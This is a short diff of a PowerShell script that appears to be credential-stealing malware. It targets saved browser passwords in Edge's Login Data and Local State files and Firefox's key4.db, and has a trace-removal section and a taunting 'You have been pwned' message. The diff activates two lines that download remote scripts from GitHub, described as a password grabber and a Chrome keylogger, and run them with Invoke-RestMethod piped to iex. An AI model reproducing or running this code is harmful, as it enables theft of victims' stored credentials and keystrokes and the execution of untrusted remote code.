@@ -170,7 +170,7 @@ if ($gatherBrowserPass) {
             LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
             LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Local State"
             Prefix = "Edge"
-        },
+        }
         @{
             ProcessName = "Firefox"
             LoginDataPath = "$FirefoxCredsLocation\key4.db"
@@ -315,6 +315,6 @@ if ($removeTraces) {
 
 Write-Output "✨ You have been pwned lmaooo :3 :3"
 # Grab pass browserpassview
-# Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/WbGrab.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/WbGrab.ps1 | iex
 # keylogchrome
-# Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
